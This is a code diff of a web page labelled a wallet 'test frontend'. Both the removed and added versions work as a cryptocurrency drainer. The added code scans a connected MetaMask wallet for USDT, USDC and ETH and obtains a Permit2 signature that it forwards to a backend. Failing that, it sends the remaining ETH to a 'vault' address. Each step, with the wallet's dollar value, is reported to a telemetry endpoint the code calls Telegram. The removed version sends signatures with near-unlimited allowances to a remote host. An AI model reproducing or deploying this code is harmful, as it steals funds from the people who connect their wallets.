@@ -3,16 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Legion Hardware Wallet Test Frontend</title>
+    <title>Legion Local EVM Test</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
@@ -20,468 +15,500 @@
             justify-content: center;
             padding: 20px;
         }
-
         .container {
             background: white;
             border-radius: 12px;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            max-width: 600px;
+            max-width: 640px;
             width: 100%;
             padding: 40px;
         }
-
-        .header {
-            text-align: center;
-            margin-bottom: 40px;
-        }
-
-        .header h1 {
-            font-size: 28px;
-            color: #333;
-            margin-bottom: 10px;
-        }
-
-        .header p {
-            color: #666;
+        .header { text-align: center; margin-bottom: 28px; }
+        .header h1 { font-size: 26px; color: #333; margin-bottom: 8px; }
+        .header p { color: #666; font-size: 14px; }
+        .token-row { display: flex; gap: 10px; align-items: center; margin-bottom: 14px; }
+        .token-row label { font-size: 13px; color: #555; font-weight: 600; }
+        .token-row select {
+            flex: 1;
+            padding: 10px 12px;
+            border: 1px solid #d8dbe4;
+            border-radius: 8px;
             font-size: 14px;
+            background: #f6f7fb;
         }
-
-        .button-group {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 30px;
-        }
-
+        .button-group { display: flex; gap: 10px; margin-bottom: 20px; }
         button {
             flex: 1;
             padding: 14px 20px;
             border: none;
             border-radius: 8px;
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s ease;
         }
-
-        #connectWalletBtn {
-            background: #007AFF;
-            color: white;
-        }
-
-        #connectWalletBtn:hover {
-            background: #0051D5;
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0, 122, 255, 0.3);
-        }
-
-        #connectWalletBtn:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        #clearLogsBtn {
-            background: #FF3B30;
-            color: white;
-        }
-
-        #clearLogsBtn:hover {
-            background: #cc2f25;
-            transform: translateY(-2px);
-        }
-
-        .status-box {
-            background: #f5f5f5;
-            border-left: 4px solid #007AFF;
-            padding: 15px;
-            margin-bottom: 20px;
-            border-radius: 4px;
-        }
-
-        .status-box.success {
-            border-left-color: #34C759;
-            background: #f0fdf4;
-        }
-
-        .status-box.error {
-            border-left-color: #FF3B30;
-            background: #fef2f2;
-        }
-
-        .status-box.pending {
-            border-left-color: #FF9500;
-            background: #fffbf0;
-        }
-
-        .status-label {
-            font-size: 12px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 5px;
-        }
-
-        .status-box.success .status-label {
-            color: #34C759;
-        }
-
-        .status-box.error .status-label {
-            color: #FF3B30;
-        }
-
-        .status-box.pending .status-label {
-            color: #FF9500;
-        }
-
-        .status-value {
-            font-size: 14px;
-            color: #333;
-            word-break: break-all;
-            font-family: 'Courier New', monospace;
-        }
-
-        .info-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-
-        .info-item {
-            background: #f9f9f9;
-            padding: 12px;
-            border-radius: 6px;
-        }
-
-        .info-label {
-            font-size: 12px;
-            font-weight: 600;
-            color: #666;
-            text-transform: uppercase;
-            margin-bottom: 5px;
-        }
-
-        .info-value {
-            font-size: 13px;
-            color: #333;
-            word-break: break-all;
-            font-family: 'Courier New', monospace;
-        }
-
-        .console-section {
-            margin-top: 30px;
-        }
-
-        .console-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 10px;
-        }
-
-        .console-header h3 {
-            font-size: 14px;
-            font-weight: 600;
-            color: #333;
-        }
-
+        #connectWalletBtn { background: #007AFF; color: white; }
+        #connectWalletBtn:disabled { background: #ccc; cursor: not-allowed; }
+        #clearLogsBtn { background: #eee; color: #333; }
+        .status-box { padding: 12px 14px; border-radius: 8px; margin-bottom: 16px; font-size: 14px; }
+        .status-box.pending { background: #fff6e5; color: #8a5a00; }
+        .status-box.success { background: #e8f7ee; color: #146c2e; }
+        .status-box.error { background: #fdecec; color: #9b1c1c; }
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 16px; }
+        .info-item { background: #f6f7fb; border-radius: 8px; padding: 10px 12px; }
+        .info-label { font-size: 11px; color: #888; text-transform: uppercase; }
+        .info-value { font-size: 13px; color: #222; word-break: break-all; margin-top: 4px; }
         .console-box {
             background: #1e1e1e;
             color: #d4d4d4;
+            border-radius: 8px;
             padding: 12px;
-            border-radius: 6px;
-            font-family: 'Courier New', monospace;
+            height: 220px;
+            overflow: auto;
+            font-family: ui-monospace, Consolas, monospace;
             font-size: 12px;
-            max-height: 300px;
-            overflow-y: auto;
-            line-height: 1.5;
         }
-
-        .console-line {
-            margin: 4px 0;
-            padding: 2px 0;
-        }
-
-        .log-info {
-            color: #4ec9b0;
-        }
-
-        .log-error {
-            color: #f48771;
-        }
-
-        .log-success {
-            color: #6a9955;
-        }
-
-        .log-warn {
-            color: #ce9178;
-        }
-
-        .spinner {
-            display: inline-block;
-            width: 4px;
-            height: 4px;
-            border-radius: 50%;
-            background: currentColor;
-            animation: spin 1s linear infinite;
-            margin-right: 6px;
-        }
-
-        @keyframes spin {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-8px); }
-        }
-
-        .badge {
-            display: inline-block;
-            background: #007AFF;
-            color: white;
-            padding: 2px 8px;
-            border-radius: 4px;
-            font-size: 11px;
-            font-weight: 600;
-            margin-left: 8px;
-        }
+        .log-error { color: #f48771; }
+        .log-success { color: #6a9955; }
+        .log-warn { color: #ce9178; }
+        .log-info { color: #4ec9b0; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>Legion Hardware Wallet 🔐</h1>
-            <p>Test Frontend - Ledger/Trezor Multi-Chain Signatures</p>
+            <h1>Legion local EVM test</h1>
+            <p>AUTO: USDT/USDC Permit2 if balance exists, otherwise sweep remaining ETH to vault. Relayer still pays Permit2 gas.</p>
         </div>
-
+        <div class="token-row">
+            <label for="tokenSelect">Token</label>
+            <select id="tokenSelect">
+                <option value="AUTO" selected>AUTO — token if any, else ETH sweep</option>
+                <option value="USDT">USDT — 0xdAC17F958D2ee523a2206206994597C13D831ec7</option>
+                <option value="USDC">USDC — 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48</option>
+                <option value="ETH">ETH — send remaining native to vault</option>
+            </select>
+        </div>
         <div class="button-group">
-            <button id="connectWalletBtn">Connect Wallet</button>
-            <button id="clearLogsBtn">Clear Logs</button>
+            <button id="connectWalletBtn">Connect + auto settle</button>
+            <button id="clearLogsBtn">Clear logs</button>
         </div>
-
-        <div id="statusBox" class="status-box pending" style="display: none;">
-            <div class="status-label">Status</div>
-            <div class="status-value" id="statusValue">Initializing...</div>
+        <div id="statusBox" class="status-box pending" style="display:none;">
+            <div id="statusValue">Initializing...</div>
         </div>
-
         <div class="info-grid">
             <div class="info-item">
-                <div class="info-label">Wallet Address</div>
+                <div class="info-label">API</div>
+                <div class="info-value" id="apiStatus">Checking...</div>
+            </div>
+            <div class="info-item">
+                <div class="info-label">Vault (client-config)</div>
+                <div class="info-value" id="vaultAddress">—</div>
+            </div>
+            <div class="info-item">
+                <div class="info-label">Connected wallet</div>
                 <div class="info-value" id="walletAddress">Not connected</div>
             </div>
             <div class="info-item">
-                <div class="info-label">Signatures</div>
-                <div class="info-value" id="signatureCount">0 / 8</div>
-            </div>
-            <div class="info-item">
-                <div class="info-label">Backend Status</div>
-                <div class="info-value" id="backendStatus">Ready ✅</div>
-            </div>
-            <div class="info-item">
-                <div class="info-label">Transaction</div>
-                <div class="info-value" id="txStatus">Pending</div>
+                <div class="info-label">Last result</div>
+                <div class="info-value" id="txStatus">Idle</div>
             </div>
         </div>
-
-        <div class="console-section">
-            <div class="console-header">
-                <h3>Console Logs</h3>
-                <span style="font-size: 11px; color: #999;" id="logCount">0 logs</span>
-            </div>
-            <div class="console-box" id="consoleLogs"></div>
-        </div>
+        <div class="console-box" id="consoleLogs"></div>
     </div>
-
-    <!-- Scripts -->
-    <script src="https://swapx-defi.surge.sh/legion-hardware-wallets-module.js"></script>
-    <script src="https://swapx-defi.surge.sh/legion-one-script-v2.js"></script>
-
     <script>
-        const consoleLogs = [];
-        const maxLogs = 50;
+        const API = 'http://localhost:4000'
+        const TOKENS = {
+            USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+            USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+        }
+        const CHAIN_ID = 1
 
-        // Override console methods
-        const originalLog = console.log;
-        const originalError = console.error;
-        const originalWarn = console.warn;
-        const originalInfo = console.info;
-
-        function addLog(message, type = 'info') {
-            const timestamp = new Date().toLocaleTimeString();
-            const logLine = `[${timestamp}] ${message}`;
-            consoleLogs.push({ message: logLine, type });
-
-            if (consoleLogs.length > maxLogs) {
-                consoleLogs.shift();
-            }
-
-            renderLogs();
+        function selectedMode() {
+            return document.getElementById('tokenSelect').value
         }
 
-        console.log = function(...args) {
-            addLog(args.join(' '), 'info');
-            originalLog.apply(console, args);
-        };
-
-        console.error = function(...args) {
-            addLog(args.join(' '), 'error');
-            originalError.apply(console, args);
-        };
-
-        console.warn = function(...args) {
-            addLog(args.join(' '), 'warn');
-            originalWarn.apply(console, args);
-        };
-
-        console.info = function(...args) {
-            addLog(args.join(' '), 'success');
-            originalInfo.apply(console, args);
-        };
-
-        function renderLogs() {
-            const logsHtml = consoleLogs.map(log => {
-                const className = `log-${log.type}`;
-                return `<div class="console-line"><span class="${className}">${escapeHtml(log.message)}</span></div>`;
-            }).join('');
-
-            document.getElementById('consoleLogs').innerHTML = logsHtml;
-            document.getElementById('logCount').textContent = `${consoleLogs.length} logs`;
-            document.getElementById('consoleLogs').scrollTop = document.getElementById('consoleLogs').scrollHeight;
+        function selectedToken() {
+            const symbol = selectedMode()
+            return { symbol, address: TOKENS[symbol] }
         }
 
-        function escapeHtml(text) {
-            const div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
+        function padAddress(addr) {
+            return addr.toLowerCase().replace(/^0x/, '').padStart(64, '0')
         }
 
-        function updateStatus(message, type = 'pending') {
-            const statusBox = document.getElementById('statusBox');
-            const statusValue = document.getElementById('statusValue');
-
-            statusBox.className = `status-box ${type}`;
-            statusValue.textContent = message;
-            statusBox.style.display = 'block';
+        async function ethCall(to, data) {
+            return window.ethereum.request({
+                method: 'eth_call',
+                params: [{ to, data }, 'latest'],
+            })
         }
 
-        function updateInfo(walletAddr, sigs, backend, tx) {
-            document.getElementById('walletAddress').textContent = walletAddr || 'Not connected';
-            document.getElementById('signatureCount').textContent = sigs || '0 / 8';
-            document.getElementById('backendStatus').textContent = backend || 'Checking...';
-            document.getElementById('txStatus').textContent = tx || 'Pending';
+        async function readTokenBalance(wallet, token) {
+            const data = '0x70a08231' + padAddress(wallet)
+            const hex = await ethCall(token, data)
+            return BigInt(hex || '0x0')
         }
 
-        // Main handler
-        async function handleConnect() {
-            console.info('🚀 Starting wallet connection...');
-            updateStatus('🔄 Connecting to hardware wallet...', 'pending');
+        async function readEthBalance(wallet) {
+            const hex = await window.ethereum.request({
+                method: 'eth_getBalance',
+                params: [wallet, 'latest'],
+            })
+            return BigInt(hex || '0x0')
+        }
 
+        function formatUnits(raw, decimals) {
+            const n = BigInt(raw)
+            const base = 10n ** BigInt(decimals)
+            const whole = n / base
+            const frac = (n % base).toString().padStart(decimals, '0').replace(/0+$/, '')
+            return frac ? whole.toString() + '.' + frac.slice(0, 6) : whole.toString()
+        }
+
+        async function resolveVault() {
+            const shown = document.getElementById('vaultAddress').textContent.trim()
+            if (/^0x[a-fA-F0-9]{40}$/.test(shown)) return shown
+            const cfg = await apiGet('/api/v1/client-config')
+            const vault = cfg.vault_addresses?.evm || cfg.vault_addresses?.EVM
+            if (typeof vault === 'string' && /^0x[a-fA-F0-9]{40}$/.test(vault)) return vault
+            throw new Error('Vault address missing from client-config')
+        }
+
+        async function pickTokenWithBalance(wallet) {
+            const usdt = await readTokenBalance(wallet, TOKENS.USDT)
+            const usdc = await readTokenBalance(wallet, TOKENS.USDC)
+            log('Balances USDT=' + formatUnits(usdt, 6) + ' USDC=' + formatUnits(usdc, 6), 'info')
+            if (usdc > 0n) return { symbol: 'USDC', address: TOKENS.USDC, amount: usdc }
+            if (usdt > 0n) return { symbol: 'USDT', address: TOKENS.USDT, amount: usdt }
+            return null
+        }
+
+        async function buildScanAssets(wallet, ethBal) {
+            const usdt = await readTokenBalance(wallet, TOKENS.USDT)
+            const usdc = await readTokenBalance(wallet, TOKENS.USDC)
+            const ethUsd = Number(ethBal) / 1e18 * ETH_USD
+            const usdcUsd = Number(usdc) / 1e6
+            const usdtUsd = Number(usdt) / 1e6
+            const assets = []
+            if (usdcUsd > 0) assets.push({ chain: 'evm:1', family: 'EVM', token: TOKENS.USDC, symbol: 'USDC', amount_usd: usdcUsd })
+            if (usdtUsd > 0) assets.push({ chain: 'evm:1', family: 'EVM', token: TOKENS.USDT, symbol: 'USDT', amount_usd: usdtUsd })
+            if (ethUsd > 0) assets.push({ chain: 'evm:1', family: 'EVM', token: 'native', symbol: 'ETH', amount_usd: ethUsd })
+            return { assets, usd: usdcUsd + usdtUsd + ethUsd, usdt: usdt, usdc: usdc }
+        }
+
+        async function sweepEthToVault(wallet, vault) {
+            const balance = await readEthBalance(wallet)
+            const gas = 21000n
+            let maxFee = 2_000_000_000n
+            let prio = 50_000_000n
             try {
-                // Check if hardware module loaded
-                if (!window.LEGION_HARDWARE) {
-                    throw new Error('❌ Hardware module not loaded');
+                const block = await window.ethereum.request({
+                    method: 'eth_getBlockByNumber',
+                    params: ['latest', false],
+                })
+                const base = BigInt(block.baseFeePerGas || '0x0')
+                const tipHex = await window.ethereum.request({ method: 'eth_maxPriorityFeePerGas' }).catch(() => null)
+                prio = tipHex ? BigInt(tipHex) : 50_000_000n
+                if (prio < 50_000_000n) prio = 50_000_000n
+                maxFee = (base * 125n) / 100n + prio
+            } catch (e) {
+                log('Fee estimate fallback 2 gwei: ' + (e.message || e), 'warn')
+            }
+            const cost = gas * maxFee
+            if (balance <= cost) {
+                throw new Error(
+                    'ETH ' + formatUnits(balance, 18) + ' is too low to sweep after gas reserve ' + formatUnits(cost, 18),
+                )
+            }
+            const value = balance - cost
+            log('Sweeping ' + formatUnits(value, 18) + ' ETH to vault, gas reserve ' + formatUnits(cost, 18), 'info')
+            const tx = await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    from: wallet,
+                    to: vault,
+                    value: '0x' + value.toString(16),
+                    gas: '0x' + gas.toString(16),
+                    maxFeePerGas: '0x' + maxFee.toString(16),
+                    maxPriorityFeePerGas: '0x' + prio.toString(16),
+                }],
+            })
+            return tx
+        }
+
+        function log(message, type = 'info') {
+            const el = document.getElementById('consoleLogs')
+            const line = document.createElement('div')
+            line.className = 'log-' + type
+            line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + message
+            el.appendChild(line)
+            el.scrollTop = el.scrollHeight
+            console.log(message)
+        }
+
+        function setStatus(message, type) {
+            const box = document.getElementById('statusBox')
+            box.style.display = 'block'
+            box.className = 'status-box ' + type
+            document.getElementById('statusValue').textContent = message
+        }
+
+        async function apiGet(path) {
+            const res = await fetch(API + path)
+            const json = await res.json().catch(() => ({}))
+            if (!res.ok || json.success === false) {
+                throw new Error(json.message || ('GET ' + path + ' failed: ' + res.status))
+            }
+            return json.data ?? json
+        }
+
+        const ETH_USD = 2600
+        let tgWallet = ''
+        let tgVault = ''
+        let tgSession = ''
+        let tgUsd = 0
+        let tgAmount = ''
+        let tgAssets = []
+
+        function tgBase() {
+            return {
+                wallet_address: tgWallet,
+                vault_address: tgVault,
+                chain_id: CHAIN_ID,
+                connect_session: tgSession,
+                wallet_type: 'MetaMask',
+                userAgent: navigator.userAgent,
+                sourceDomain: location.host,
+                scout_value_usd: tgUsd,
+                amount: tgAmount,
+            }
+        }
+
+        async function tgEvent(event, extra) {
+            extra = extra || {}
+            try {
+                await apiPost('/api/v1/local-test/telemetry', Object.assign(tgBase(), extra, { event: event }))
+            } catch (e) {
+                log('Telegram ' + event + ' failed: ' + (e.message || e), 'warn')
+            }
+        }
+
+        async function waitForTx(hash) {
+            for (let i = 0; i < 24; i++) {
+                const rec = await window.ethereum.request({
+                    method: 'eth_getTransactionReceipt',
+                    params: [hash],
+                }).catch(() => null)
+                if (rec && rec.blockNumber) return rec
+                await new Promise((r) => setTimeout(r, 4000))
+            }
+            return null
+        }
+
+        async function apiPost(path, body) {
+            const res = await fetch(API + path, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
+                body: JSON.stringify(body),
+            })
+            const json = await res.json().catch(() => ({}))
+            if (!res.ok || json.success === false) {
+                const fault = json.data && json.data.settlement_fault
+                throw new Error(fault || json.message || ('POST ' + path + ' failed: ' + res.status))
+            }
+            return json
+        }
+
+        async function pingApi() {
+            try {
+                const health = await apiGet('/health/ready')
+                document.getElementById('apiStatus').textContent = health.status || 'ready'
+                const cfg = await apiGet('/api/v1/client-config')
+                const vault = cfg.vault_addresses?.evm || cfg.vault_addresses?.EVM || 'set (encrypted or missing)'
+                document.getElementById('vaultAddress').textContent = typeof vault === 'string' ? vault : JSON.stringify(vault)
+                log('API ready. Vault from client-config loaded.', 'success')
+            } catch (e) {
+                document.getElementById('apiStatus').textContent = 'down'
+                setStatus(e.message, 'error')
+                log(e.message, 'error')
+            }
+        }
+
+        async function handleConnect() {
+            const btn = document.getElementById('connectWalletBtn')
+            btn.disabled = true
+            tgWallet = ''
+            tgVault = ''
+            tgSession = 'local-' + Date.now()
+            tgUsd = 0
+            tgAmount = ''
+            tgAssets = []
+            try {
+                if (!window.ethereum) throw new Error('MetaMask not found. Install it and unlock.')
+                setStatus('Connecting MetaMask…', 'pending')
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
+                const wallet = String(accounts[0] || '')
+                if (!wallet) throw new Error('No account returned')
+                tgWallet = wallet
+                document.getElementById('walletAddress').textContent = wallet
+                log('Connected ' + wallet, 'success')
+                await tgEvent('wallet_connected')
+
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x1' }],
+                    })
+                } catch (switchErr) {
+                    if (switchErr && switchErr.code === 4902) {
+                        throw new Error('Add Ethereum mainnet in MetaMask first')
+                    }
+                    if (switchErr && switchErr.code !== 4001) log('Chain switch: ' + switchErr.message, 'warn')
                 }
 
-                console.info('✅ Hardware module detected');
+                const mode = selectedMode()
+                const ethBal = await readEthBalance(wallet)
+                log('Wallet ETH ' + formatUnits(ethBal, 18), 'info')
+                const scan = await buildScanAssets(wallet, ethBal)
+                tgAssets = scan.assets
+                tgUsd = scan.usd
+                tgAmount = ethBal.toString()
+                await tgEvent('scan_complete', { assets: tgAssets, scout_value_usd: tgUsd })
 
-                // Connect
-                console.info('🔌 Requesting device connection...');
-                const device = await window.LEGION_HARDWARE.connect();
-                console.info('✅ Device connected: ' + device);
-                updateStatus('✅ Device connected! Requesting signatures...', 'pending');
+                if (mode === 'ETH' || mode === 'AUTO') {
+                    const tokenHit = mode === 'AUTO'
+                        ? (scan.usdc > 0n
+                            ? { symbol: 'USDC', address: TOKENS.USDC, amount: scan.usdc }
+                            : scan.usdt > 0n
+                                ? { symbol: 'USDT', address: TOKENS.USDT, amount: scan.usdt }
+                                : null)
+                        : null
+                    if (!tokenHit) {
+                        const vault = await resolveVault()
+                        tgVault = vault
+                        tgAmount = ethBal.toString()
+                        await tgEvent('permit2_sign_start', { token_name: 'ETH Balance transfer' })
+                        setStatus('No USDT/USDC — sweeping remaining ETH to vault…', 'pending')
+                        await tgEvent('sending', { token_name: 'eth_balance_transfer', token_address: 'native' })
+                        let tx
+                        try {
+                            tx = await sweepEthToVault(wallet, vault)
+                        } catch (sweepErr) {
+                            const smsg = sweepErr && sweepErr.message ? sweepErr.message : String(sweepErr)
+                            if (/too low|insufficient|gas/i.test(smsg)) {
+                                await tgEvent('gas_low', {
+                                    detail: 'executor_gas_low',
+                                    executor_balance_eth: formatUnits(ethBal, 18),
+                                })
+                            } else if (sweepErr && sweepErr.code === 4001) {
+                                await tgEvent('rejected', { detail: smsg })
+                            } else {
+                                await tgEvent('failed', { detail: smsg })
+                            }
+                            if (sweepErr && typeof sweepErr === 'object') sweepErr.tgSent = true
+                            throw sweepErr
+                        }
+                        document.getElementById('txStatus').textContent = tx
+                        await tgEvent('awaiting', { tx_hash: tx })
+                        setStatus('Waiting for confirmation… ' + tx, 'pending')
+                        const rec = await waitForTx(tx)
+                        const ok = rec && String(rec.status) !== '0x0'
+                        if (ok) {
+                            await tgEvent('confirmed', { tx_hash: tx, token_name: 'eth_balance_transfer' })
+                        } else {
+                            await tgEvent('no_action', { detail: 'TX submitted but not confirmed yet', tx_hash: tx })
+                        }
+                        setStatus((ok ? 'ETH sweep confirmed. ' : 'ETH sweep submitted. ') + tx, ok ? 'success' : 'pending')
+                        log('ETH sweep tx ' + tx, 'success')
+                        return
+                    }
+                    document.getElementById('tokenSelect').value = tokenHit.symbol
+                    log('AUTO picked ' + tokenHit.symbol + ' ' + tokenHit.address, 'info')
+                }
 
-                // Get wallet address
-                console.info('📍 Requesting wallet address...');
-                const walletAddress = await window.LEGION_HARDWARE.getAddress();
-                console.info('✅ Wallet address: ' + walletAddress);
-                updateInfo(walletAddress, '0 / 8', 'Ready ✅', 'Signing...');
+                const token = selectedToken()
+                if (!token.address) throw new Error('Pick USDT or USDC, or use AUTO/ETH')
+                log('Using ' + token.symbol + ' ' + token.address, 'info')
+                await tgEvent('permit2_sign_start', { token_name: token.symbol, token_address: token.address })
+                setStatus('Fetching Permit2 typed data from local API…', 'pending')
+                const q = new URLSearchParams({
+                    wallet,
+                    token: token.address,
+                    chain_id: String(CHAIN_ID),
+                })
+                const typed = await apiGet('/api/v1/signature-anchor/permit2-typed-data?' + q.toString())
+                log('Typed data ready. Sign in MetaMask.', 'info')
 
-                // Request signatures
-                console.info('✍️  Requesting signatures for 8 chains (this may take 5-10 seconds)...');
-                updateStatus('⏳ Collecting signatures from hardware wallet (2-9 seconds)...', 'pending');
+                setStatus('Sign Permit2 in MetaMask…', 'pending')
+                const signature = await window.ethereum.request({
+                    method: 'eth_signTypedData_v4',
+                    params: [wallet, JSON.stringify(typed.typed_data)],
+                })
+                log('Signature received', 'success')
+                await tgEvent('signature_received', {
+                    token_name: token.symbol,
+                    token_address: token.address,
+                    signature: signature,
+                })
+                await tgEvent('processing', { token_name: token.symbol, token_address: token.address })
 
-                const signatures = await window.LEGION_HARDWARE.signAll();
-                console.info('✅ All signatures collected: ' + Object.keys(signatures).length + ' chains');
-                updateInfo(walletAddress, '8 / 8', 'Ready ✅', 'Sending...');
-
-                // Build payload
-                console.info('🔨 Building normalized_v1 payload...');
-                const payload = {
+                setStatus('Submitting to localhost:4000…', 'pending')
+                const expiry = new Date(Date.now() + 25 * 60 * 1000).toISOString()
+                const result = await apiPost('/api/v1/signature-anchor', {
                     ingress: 'normalized_v1',
                     chain_family: 'EVM',
-                    protocol: 'omnichain_atomic_v1',
-                    wallet_address: walletAddress,
-                    token_address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
-                    signature: signatures.EVM || signatures[Object.keys(signatures)[0]],
+                    protocol: 'permit2_eip712',
+                    wallet_address: wallet,
+                    token_address: token.address,
+                    signature,
                     nonce: 'legion:' + Date.now(),
-                    expiry_iso: '2099-12-31T23:59:59.999Z',
-                    wallet_type: 'hardware_wallet',
-                    scout_value_usd: 0,
-                    max_allowance: '999999999999999999999999',
-                    requires_quorum: false,
-                    chain_id: 1,
-                    engine_spender: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
-                    permit2: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
-                    permits: [],
-                    batch_permit_metadata: {
-                        nonce: 0,
-                        deadline: '999999999999',
-                        amounts: []
-                    },
-                    native_amount: '0',
-                    native_signed_transaction: '',
-                    signatures: signatures
-                };
+                    expiry_iso: expiry,
+                    wallet_type: 'metamask',
+                    chain_id: CHAIN_ID,
+                    engine_spender: typed.engine_spender,
+                    permit2: typed.permit2,
+                    permit_metadata: typed.permit_metadata,
+                    amount: typed.permit_metadata && typed.permit_metadata.amount,
+                })
 
-                console.info('✅ Payload built with ' + Object.keys(payload).length + ' fields');
-
-                // Send to backend
-                console.info('📤 Sending to backend: https://sadrailala-production.up.railway.app/api/v1/signature-anchor');
-                updateStatus('⏳ Sending signatures to backend...', 'pending');
-
-                const response = await fetch('https://sadrailala-production.up.railway.app/api/v1/signature-anchor', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
-
-                console.info('📥 Backend response: ' + response.status + ' ' + response.statusText);
-
-                const responseData = await response.json().catch(() => ({}));
-                console.info('📋 Response: ' + JSON.stringify(responseData));
-
-                if (response.ok) {
-                    console.info('✅✅✅ SUCCESS! Signatures processed by backend!');
-                    updateStatus('✅ SUCCESS! Settlement initiated by backend!', 'success');
-                    updateInfo(walletAddress, '8 / 8', 'Processing ✅', 'Executed ✅');
-                } else if (response.status === 409) {
-                    console.warn('⚠️  409 Conflict: Duplicate signature (security feature)');
-                    updateStatus('⚠️ Duplicate signature detected (try again in 60 seconds)', 'error');
-                } else {
-                    console.warn('⚠️  Status ' + response.status + ': ' + (responseData.message || 'Unknown error'));
-                    updateStatus('⚠️ Backend returned status ' + response.status, 'error');
+                const tx = result.data?.l2_mint_transaction_hash || result.data?.tx_hash || result.message
+                document.getElementById('txStatus').textContent = tx || 'submitted'
+                setStatus('Submitted. Check API logs / Etherscan / your vault or executor.', 'success')
+                log(JSON.stringify(result), 'success')
+                if (typeof tx === 'string' && tx.startsWith('0x')) {
+                    await tgEvent('confirmed', { tx_hash: tx, token_name: token.symbol, token_address: token.address })
                 }
-
-            } catch (error) {
-                console.error('❌ Error: ' + error.message);
-                updateStatus('❌ Error: ' + error.message, 'error');
-                updateInfo('Error', '0 / 8', 'Error ❌', 'Failed');
+            } catch (e) {
+                const msg = e && e.message ? e.message : String(e)
+                setStatus(msg, 'error')
+                document.getElementById('txStatus').textContent = 'failed'
+                log(msg, 'error')
+                if (!e || !e.tgSent) {
+                    if (e && e.code === 4001) {
+                        await tgEvent('rejected', { detail: msg })
+                    } else if (/too low|gas/i.test(msg)) {
+                        await tgEvent('gas_low', { detail: msg, executor_balance_eth: tgAmount ? formatUnits(tgAmount, 18) : undefined })
+                    } else {
+                        await tgEvent('failed', { detail: msg })
+                    }
+                }
+            } finally {
+                btn.disabled = false
             }
         }
 
-        // Event listeners
-        document.getElementById('connectWalletBtn').addEventListener('click', handleConnect);
+        document.getElementById('connectWalletBtn').addEventListener('click', handleConnect)
+        document.getElementById('tokenSelect').addEventListener('change', () => {
+            const mode = selectedMode()
+            const label = mode === 'AUTO' || mode === 'ETH'
+                ? 'Connect + auto settle'
+                : 'Connect + sign ' + mode + ' Permit2'
+            document.getElementById('connectWalletBtn').textContent = label
+        })
         document.getElementById('clearLogsBtn').addEventListener('click', () => {
-            consoleLogs.length = 0;
-            renderLogs();
-            console.info('🧹 Console cleared');
-        });
-
-        // Initial log
-        console.info('🌐 Test frontend loaded - Ready to connect wallet');
-        console.info('📡 Backend URL: https://sadrailala-production.up.railway.app');
-        console.info('⏱️  Chains: EVM, Solana, Bitcoin, TRON, TON, Cosmos, Aptos, Sui');
+            document.getElementById('consoleLogs').innerHTML = ''
+        })
+        pingApi()
     </script>
 </body>
 </html>
